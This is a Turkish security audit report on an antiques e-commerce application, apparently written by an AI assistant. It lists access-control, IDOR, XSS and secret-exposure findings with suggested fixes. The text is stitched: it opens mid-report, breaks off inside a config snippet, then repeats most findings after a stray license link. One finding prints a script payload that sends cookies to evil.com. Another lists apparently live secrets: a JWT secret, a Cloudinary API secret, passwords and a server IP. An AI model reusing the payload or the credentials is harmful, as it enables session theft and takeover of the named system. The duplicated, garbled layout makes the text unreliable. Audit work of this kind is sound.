    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Refer
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

